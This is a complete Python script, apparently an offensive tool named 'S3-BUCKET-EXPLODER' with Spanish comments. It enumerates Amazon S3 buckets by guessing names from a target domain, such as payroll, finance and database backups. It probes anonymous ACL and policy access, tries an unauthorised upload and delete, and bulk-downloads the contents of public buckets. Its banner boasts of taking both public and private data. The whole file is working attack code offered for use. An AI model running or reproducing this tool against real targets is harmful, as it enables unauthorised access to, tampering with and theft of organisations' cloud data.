#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
📦 S3-BUCKET-EXPLODER v1.0 - El que revienta buckets de Amazon 📦
Autor: Falconmx1
GitHub: https://github.com/Falconmx1/CLOUD-HACKING
Descripción: Enumeración masiva y explotación de buckets S3
"""

import argparse
import sys
import json
import boto3
import requests
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from fake_useragent import UserAgent
import os
import re
import urllib3

# Desactivar warnings de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Inicializar colorama
init(autoreset=True)

# ==================== CONFIGURACIÓN ====================
VERDE = Fore.GREEN
ROJO = Fore.RED
AMARILLO = Fore.YELLOW
AZUL = Fore.CYAN
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

VERSION = "1.0"
BANNER = f"""
{MAGENTA}╔═══════════════════════════════════════════════════════════════╗
{MAGENTA}║     📦 S3-BUCKET-EXPLODER v{VERSION} - EL REVIENTA BUCKETS 📦   ║
{MAGENTA}║            Creado por: Falconmx1 🔥                          ║
{MAGENTA}║       "Si es público, es mío. Si es privado, lo haré público" ║
{MAGENTA}╚═══════════════════════════════════════════════════════════════╝{RESET}
"""

class S3Exploder:
    def __init__(self, target=None, wordlist=None, threads=50, output=None, verbose=False, download=False):
        self.target = target.lower() if target else None
        self.wordlist = wordlist
        self.threads = threads
        self.output = output
        self.verbose = verbose
        self.download = download
        self.ua = UserAgent()
        self.lock = threading.Lock()
        
        # Limpiar target
        if self.target:
            self.target = self.target.replace('http://', '').replace('https://', '').replace('www.', '')
            self.base_name = self.target.split('.')[0] if '.' in self.target else self.target
        else:
            self.base_name = None
        
        # Resultados
        self.results = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "buckets": [],
            "public_buckets": [],
            "private_buckets": [],
            "files_found": [],
            "downloadable_files": []
        }
        
        # Regiones de S3
        self.regions = [
            'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2',
            'af-south-1', 'ap-east-1', 'ap-south-1', 'ap-northeast-1',
            'ap-northeast-2', 'ap-northeast-3', 'ap-southeast-1', 'ap-southeast-2',
            'ca-central-1', 'eu-central-1', 'eu-west-1', 'eu-west-2',
            'eu-west-3', 'eu-south-1', 'eu-north-1', 'me-south-1',
            'sa-east-1', 'us-gov-east-1', 'us-gov-west-1'
        ]
        
        # Formatos de URL de S3
        self.url_formats = [
            "http://{bucket}.s3.amazonaws.com",
            "http://s3.amazonaws.com/{bucket}",
            "http://{bucket}.s3-website-{region}.amazonaws.com",
            "http://{bucket}.s3.{region}.amazonaws.com",
            "https://{bucket}.s3.amazonaws.com",
            "https://s3.amazonaws.com/{bucket}",
            "https://{bucket}.s3-website-{region}.amazonaws.com",
            "https://{bucket}.s3.{region}.amazonaws.com"
        ]
    
    # ========== UTILIDADES ==========
    def log(self, message, level="info"):
        """Sistema de logging"""
        with self.lock:
            timestamp = datetime.now().strftime('%H:%M:%S')
            if level == "info":
                print(f"{AZUL}[{timestamp}][*]{RESET} {message}")
            elif level == "success":
                print(f"{VERDE}[{timestamp}][+]{RESET} {message}")
            elif level == "error":
                print(f"{ROJO}[{timestamp}][-]{RESET} {message}")
            elif level == "warning":
                print(f"{AMARILLO}[{timestamp}][!]{RESET} {message}")
            elif level == "found":
                print(f"{MAGENTA}[{timestamp}][🔥]{RESET} {message}")
            elif level == "debug" and self.verbose:
                print(f"{AMARILLO}[{timestamp}][DEBUG]{RESET} {message}")
    
    def save_results(self):
        """Guarda resultados"""
        filename = self.output or f"s3_exploder_{self.target or 'scan'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=4)
        self.log(f"Resultados guardados en: {filename}", "success")
    
    # ========== GENERACIÓN DE NOMBRES DE BUCKET ==========
    def generate_bucket_names(self):
        """Genera nombres de buckets basados en el target o wordlist"""
        bucket_names = []
        
        if self.wordlist:
            # Cargar wordlist de archivo
            try:
                with open(self.wordlist, 'r') as f:
                    bucket_names = [line.strip() for line in f if line.strip()]
                self.log(f"Cargados {len(bucket_names)} nombres de wordlist", "success")
            except Exception as e:
                self.log(f"Error cargando wordlist: {str(e)}", "error")
                sys.exit(1)
        elif self.target:
            # Generar nombres basados en el dominio
            base_names = [
                self.base_name,
                self.target,
                f"{self.base_name}-backup",
                f"{self.base_name}-backups",
                f"{self.base_name}-data",
                f"{self.base_name}-database",
                f"{self.base_name}-db",
                f"{self.base_name}-files",
                f"{self.base_name}-static",
                f"{self.base_name}-assets",
                f"{self.base_name}-media",
                f"{self.base_name}-uploads",
                f"{self.base_name}-public",
                f"{self.base_name}-private",
                f"{self.base_name}-prod",
                f"{self.base_name}-production",
                f"{self.base_name}-dev",
                f"{self.base_name}-development",
                f"{self.base_name}-test",
                f"{self.base_name}-testing",
                f"{self.base_name}-staging",
                f"{self.base_name}-qa",
                f"{self.base_name}-stage",
                f"{self.base_name}-demo",
                f"{self.base_name}-internal",
                f"{self.base_name}-external",
                f"{self.base_name}-customer",
                f"{self.base_name}-customers",
                f"{self.base_name}-user",
                f"{self.base_name}-users",
                f"{self.base_name}-content",
                f"{self.base_name}-docs",
                f"{self.base_name}-documents",
                f"{self.base_name}-pdf",
                f"{self.base_name}-images",
                f"{self.base_name}-img",
                f"{self.base_name}-css",
                f"{self.base_name}-js",
                f"{self.base_name}-javascript",
                f"{self.base_name}-config",
                f"{self.base_name}-conf",
                f"{self.base_name}-settings",
                f"{self.base_name}-env",
                f"{self.base_name}-environment",
                f"{self.base_name}-logs",
                f"{self.base_name}-log",
                f"{self.base_name}-archive",
                f"{self.base_name}-archives",
                f"{self.base_name}-old",
                f"{self.base_name}-new",
                f"{self.base_name}-temp",
                f"{self.base_name}-tmp",
                f"{self.base_name}-cache",
                f"{self.base_name}-download",
                f"{self.base_name}-downloads",
                f"{self.base_name}-upload",
                f"{self.base_name}-uploads",
                f"{self.base_name}-export",
                f"{self.base_name}-exports",
                f"{self.base_name}-import",
                f"{self.base_name}-imports",
                f"{self.base_name}-backup-2024",
                f"{self.base_name}-backup-2025",
                f"{self.base_name}-2024",
                f"{self.base_name}-2025",
                f"{self.base_name}-data-backup",
                f"{self.base_name}-database-backup",
                f"{self.base_name}-mysql",
                f"{self.base_name}-postgres",
                f"{self.base_name}-mongodb",
                f"{self.base_name}-redis",
                f"{self.base_name}-elasticsearch",
                f"{self.base_name}-search",
                f"{self.base_name}-api",
                f"{self.base_name}-rest",
                f"{self.base_name}-graphql",
                f"{self.base_name}-lambda",
                f"{self.base_name}-function",
                f"{self.base_name}-app",
                f"{self.base_name}-application",
                f"{self.base_name}-web",
                f"{self.base_name}-website",
                f"{self.base_name}-www",
                f"{self.base_name}-static-website",
                f"{self.base_name}-cdn",
                f"{self.base_name}-cloudfront",
                f"{self.base_name}-distribution",
                f"{self.base_name}-origin",
                f"{self.base_name}-source",
                f"{self.base_name}-code",
                f"{self.base_name}-repo",
                f"{self.base_name}-git",
                f"{self.base_name}-github",
                f"{self.base_name}-gitlab",
                f"{self.base_name}-bitbucket",
                f"{self.base_name}-svn",
                f"{self.base_name}-release",
                f"{self.base_name}-releases",
                f"{self.base_name}-build",
                f"{self.base_name}-builds",
                f"{self.base_name}-ci",
                f"{self.base_name}-cd",
                f"{self.base_name}-jenkins",
                f"{self.base_name}-jira",
                f"{self.base_name}-confluence",
                f"{self.base_name}-wiki",
                f"{self.base_name}-docs-internal",
                f"{self.base_name}-internal-docs",
                f"{self.base_name}-hr",
                f"{self.base_name}-payroll",
                f"{self.base_name}-finance",
                f"{self.base_name}-accounting",
                f"{self.base_name}-invoices",
                f"{self.base_name}-billing",
                f"{self.base_name}-payment",
                f"{self.base_name}-payments",
                f"{self.base_name}-transactions",
                f"{self.base_name}-orders",
                f"{self.base_name}-order",
                f"{self.base_name}-sales",
                f"{self.base_name}-products",
                f"{self.base_name}-product",
                f"{self.base_name}-inventory",
                f"{self.base_name}-stock",
                f"{self.base_name}-warehouse",
                f"{self.base_name}-logistics",
                f"{self.base_name}-shipping",
                f"{self.base_name}-delivery",
                f"{self.base_name}-tracking",
                f"{self.base_name}-support",
                f"{self.base_name}-help",
                f"{self.base_name}-helpdesk",
                f"{self.base_name}-ticket",
                f"{self.base_name}-tickets"
            ]
            
            # Generar variaciones
            for name in base_names:
                bucket_names.append(name)
                bucket_names.append(name.replace('.', '-'))
                bucket_names.append(name.replace('.', ''))
                bucket_names.append(name.upper())
                bucket_names.append(name.lower())
                bucket_names.append(name.replace('-', ''))
                bucket_names.append(name.replace('_', '-'))
        
        else:
            # Wordlist por defecto (común)
            bucket_names = [
                "backup", "backups", "data", "database", "db", "files",
                "static", "assets", "media", "uploads", "public", "private",
                "prod", "production", "dev", "development", "test", "testing",
                "staging", "qa", "stage", "demo", "internal", "external",
                "customer", "customers", "user", "users", "content", "docs",
                "documents", "pdf", "images", "img", "css", "js", "javascript",
                "config", "conf", "settings", "env", "environment", "logs",
                "log", "archive", "archives", "old", "new", "temp", "tmp",
                "cache", "download", "downloads", "upload", "uploads",
                "export", "exports", "import", "imports"
            ]
        
        # Quitar duplicados y limitar
        bucket_names = list(set(bucket_names))
        self.log(f"Total nombres a probar: {len(bucket_names)}", "info")
        return bucket_names
    
    # ========== VERIFICACIÓN DE BUCKETS ==========
    def check_bucket(self, bucket_name):
        """Verifica si un bucket existe y su estado"""
        for region in self.regions[:3]:  # Probar solo 3 regiones para no saturar
            for url_format in self.url_formats:
                try:
                    url = url_format.format(bucket=bucket_name, region=region)
                    headers = {'User-Agent': self.ua.random}
                    
                    response = requests.get(url, headers=headers, timeout=3, allow_redirects=False)
                    
                    bucket_info = {
                        'bucket': bucket_name,
                        'url': url,
                        'status_code': response.status_code,
                        'region': region
                    }
                    
                    # Clasificar según respuesta
                    if response.status_code == 200:
                        # Bucket público
                        bucket_info['status'] = 'PUBLIC'
                        bucket_info['listing'] = self.parse_bucket_listing(response.text)
                        
                        with self.lock:
                            self.results['public_buckets'].append(bucket_info)
                            self.results['buckets'].append(bucket_info)
                            self.log(f"🔥 Bucket PÚBLICO: {url}", "found")
                            
                            # Extraer archivos
                            if bucket_info['listing']:
                                for file_info in bucket_info['listing'][:10]:  # Mostrar primeros 10
                                    self.log(f"  📄 {file_info['key']} ({file_info['size']} bytes)", "debug")
                        
                        return bucket_info
                        
                    elif response.status_code == 403:
                        # Bucket existe pero privado
                        bucket_info['status'] = 'PRIVATE'
                        
                        with self.lock:
                            self.results['private_buckets'].append(bucket_info)
                            self.results['buckets'].append(bucket_info)
                            self.log(f"🔒 Bucket privado: {url}", "warning")
                        
                        return bucket_info
                        
                    elif response.status_code == 404:
                        continue
                        
                except requests.exceptions.ConnectionError:
                    continue
                except Exception as e:
                    self.log(f"Error con {bucket_name}: {str(e)[:50]}", "debug")
                    continue
        
        return None
    
    def parse_bucket_listing(self, xml_text):
        """Parsea el XML de listado de S3"""
        files = []
        
        # Extraer información básica con regex
        import re
        
        # Buscar keys
        keys = re.findall(r'<Key>(.*?)</Key>', xml_text)
        sizes = re.findall(r'<Size>(.*?)</Size>', xml_text)
        last_modified = re.findall(r'<LastModified>(.*?)</LastModified>', xml_text)
        
        for i, key in enumerate(keys):
            file_info = {
                'key': key,
                'size': int(sizes[i]) if i < len(sizes) else 0,
                'last_modified': last_modified[i] if i < len(last_modified) else 'Unknown'
            }
            files.append(file_info)
            self.results['files_found'].append(file_info)
        
        return files
    
    # ========== DESCARGA DE ARCHIVOS ==========
    def download_files(self, bucket_info):
        """Descarga archivos de buckets públicos"""
        if not self.download:
            return
        
        bucket_name = bucket_info['bucket']
        
        # Crear directorio para descargas
        download_dir = f"downloads/{bucket_name}"
        os.makedirs(download_dir, exist_ok=True)
        
        self.log(f"Descargando archivos de {bucket_name}...", "info")
        
        # Usar boto3 para descargar
        try:
            s3 = boto3.client('s3', config=boto3.session.Config(signature_version='unsigned'))
            
            # Listar objetos
            response = s3.list_objects_v2(Bucket=bucket_name, MaxKeys=100)
            
            if 'Contents' in response:
                for obj in response['Contents']:
                    key = obj['Key']
                    local_path = os.path.join(download_dir, key)
                    
                    # Crear subdirectorios si es necesario
                    os.makedirs(os.path.dirname(local_path), exist_ok=True)
                    
                    try:
                        s3.download_file(bucket_name, key, local_path)
                        self.log(f"  ✅ Descargado: {key}", "success")
                        
                        self.results['downloadable_files'].append({
                            'bucket': bucket_name,
                            'key': key,
                            'local_path': local_path
                        })
                    except Exception as e:
                        self.log(f"  ❌ Error descargando {key}: {str(e)[:50]}", "error")
        
        except Exception as e:
            self.log(f"Error usando boto3: {str(e)}", "error")
            
            # Fallback con requests
            try:
                # Listar via HTTP
                list_url = f"http://{bucket_name}.s3.amazonaws.com/"
                response = requests.get(list_url)
                
                if response.status_code == 200:
                    keys = re.findall(r'<Key>(.*?)</Key>', response.text)
                    
                    for key in keys[:20]:  # Limitar a 20 archivos
                        file_url = f"http://{bucket_name}.s3.amazonaws.com/{key}"
                        local_path = os.path.join(download_dir, key.replace('/', '_'))
                        
                        try:
                            file_response = requests.get(file_url, stream=True)
                            if file_response.status_code == 200:
                                with open(local_path, 'wb') as f:
                                    for chunk in file_response.iter_content(chunk_size=8192):
                                        f.write(chunk)
                                self.log(f"  ✅ Descargado: {key}", "success")
                        except:
                            pass
            except:
                pass
    
    # ========== VERIFICACIÓN DE PERMISOS ==========
    def check_permissions(self, bucket_name):
        """Verifica permisos adicionales del bucket"""
        self.log(f"Verificando permisos de {bucket_name}...", "debug")
        
        try:
            s3 = boto3.client('s3', config=boto3.session.Config(signature_version='unsigned'))
            
            # Intentar obtener ACL
            try:
                acl = s3.get_bucket_acl(Bucket=bucket_name)
                self.log(f"  ACL del bucket: {acl}", "debug")
            except:
                pass
            
            # Intentar obtener política
            try:
                policy = s3.get_bucket_policy(Bucket=bucket_name)
                self.log(f"  Política del bucket encontrada", "debug")
            except:
                pass
            
            # Intentar subir archivo de prueba
            try:
                test_content = b"test"
                s3.put_object(Bucket=bucket_name, Key="test.txt", Body=test_content)
                self.log(f"  ⚠️ SE PUEDE SUBIR ARCHIVOS al bucket!", "warning")
                
                # Limpiar
                s3.delete_object(Bucket=bucket_name, Key="test.txt")
            except:
                pass
                
        except Exception as e:
            self.log(f"  Error verificando permisos: {str(e)[:50]}", "debug")
    
    # ========== FUNCIÓN PRINCIPAL ==========
    def run(self):
        """Ejecuta la enumeración"""
        print(BANNER)
        
        if self.target:
            self.log(f"Objetivo: {self.target}", "info")
        self.log(f"Hilos: {self.threads}", "info")
        self.log(f"Descargar archivos: {self.download}", "info")
        print()
        
        # Generar nombres de buckets
        bucket_names = self.generate_bucket_names()
        
        # Escanear buckets
        self.log("Iniciando escaneo de buckets...", "info")
        print()
        
        found_buckets = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_bucket = {executor.submit(self.check_bucket, name): name for name in bucket_names}
            
            for i, future in enumerate(as_completed(future_to_bucket), 1):
                bucket_name = future_to_bucket[future]
                try:
                    result = future.result()
                    if result:
                        found_buckets.append(result)
                        
                        # Verificar permisos adicionales
                        self.check_permissions(bucket_name)
                        
                        # Descargar archivos si se solicita
                        if self.download and result['status'] == 'PUBLIC':
                            self.download_files(result)
                            
                except Exception as e:
                    self.log(f"Error con {bucket_name}: {str(e)}", "error")
        
        # Resumen final
        print(f"\n{MAGENTA}{'='*60}{RESET}")
        print(f"{MAGENTA}📊 RESUMEN FINAL{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        print(f"Total buckets encontrados: {len(self.results['buckets'])}")
        print(f"  🟢 Públicos: {len(self.results['public_buckets'])}")
        print(f"  🔴 Privados: {len(self.results['private_buckets'])}")
        print(f"Total archivos encontrados: {len(self.results['files_found'])}")
        
        if self.results['public_buckets']:
            print(f"\n{VERDE}Buckets públicos:{RESET}")
            for bucket in self.results['public_buckets'][:5]:
                print(f"  {VERDE}→ {bucket['url']}{RESET}")
        
        # Guardar resultados
        self.save_results()
        print()

def main():
    parser = argparse.ArgumentParser(
        description='📦 S3 Bucket Exploder - Enumeración y explotación de buckets S3',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  python3 s3-bucket-exploder.py -t ejemplo.com
  python3 s3-bucket-exploder.py -t empresa.com --download
  python3 s3-bucket-exploder.py -w buckets.txt -t empresa.com --threads 100
  python3 s3-bucket-exploder.py -t  # Solo wordlist por defecto
        """
    )
    
    parser.add_argument('-t', '--target', help='Dominio objetivo (ej: ejemplo.com)')
    parser.add_argument('-w', '--wordlist', help='Archivo con nombres de buckets')
    parser.add_argument('--threads', type=int, default=50, help='Número de hilos (default: 50)')
    parser.add_argument('-o', '--output', help='Archivo de salida (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verbose')
    parser.add_argument('--download', action='store_true', help='Descargar archivos encontrados')
    
    args = parser.parse_args()
    
    if not args.target and not args.wordlist:
        parser.print_help()
        print(f"\n{ROJO}[-] Error: Necesitas especificar --target o --wordlist{RESET}")
        sys.exit(1)
    
    exploder = S3Exploder(
        target=args.target,
        wordlist=args.wordlist,
        threads=args.threads,
        output=args.output,
        verbose=args.verbose,
        download=args.download
    )
    
    try:
        exploder.run()
    except KeyboardInterrupt:
        print(f"\n{ROJO}[!] Proceso interrumpido{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{ROJO}[!] Error: {str(e)}{RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
